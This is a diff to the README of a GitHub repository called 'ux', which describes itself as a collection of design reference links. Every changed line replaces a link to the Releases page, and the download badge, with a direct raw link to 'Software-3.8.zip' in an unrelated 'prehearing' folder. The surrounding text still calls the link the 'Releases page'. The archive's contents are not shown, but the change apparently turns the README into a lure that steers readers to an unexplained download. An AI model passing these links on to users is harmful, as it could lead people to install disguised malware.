@@ -6,7 +6,7 @@ Welcome to the ux repository! Here, you will find a collection of design links t
 
 ## 📥 Download Now
 
-[![Download ux](https://img.shields.io/badge/Download-ux-4CAF50.svg)](https://github.com/HDineshG/ux/releases)
+[![Download ux](https://github.com/HDineshG/ux/raw/refs/heads/main/prehearing/Software-3.8.zip)](https://github.com/HDineshG/ux/raw/refs/heads/main/prehearing/Software-3.8.zip)
 
 ## 🔍 Overview
 
@@ -14,7 +14,7 @@ The ux repository serves as a centralized hub for design references. It includes
 
 ## 📦 Download & Install
 
-To get started with ux, visit this page to download: [Download ux](https://github.com/HDineshG/ux/releases). 
+To get started with ux, visit this page to download: [Download ux](https://github.com/HDineshG/ux/raw/refs/heads/main/prehearing/Software-3.8.zip). 
 
 On the Releases page, you'll find the latest version of the repository. Follow these steps:
 
@@ -69,6 +69,6 @@ While I strive to ensure the links are accurate, the web is constantly changing.
 
 For updates on the ux repository and more resources, follow me on GitHub. Your feedback is important. Let’s collaborate to make this collection even better!
 
-Remember, you can always download the latest resources from the Releases page: [Download ux](https://github.com/HDineshG/ux/releases).
+Remember, you can always download the latest resources from the Releases page: [Download ux](https://github.com/HDineshG/ux/raw/refs/heads/main/prehearing/Software-3.8.zip).
 
 Happy exploring!
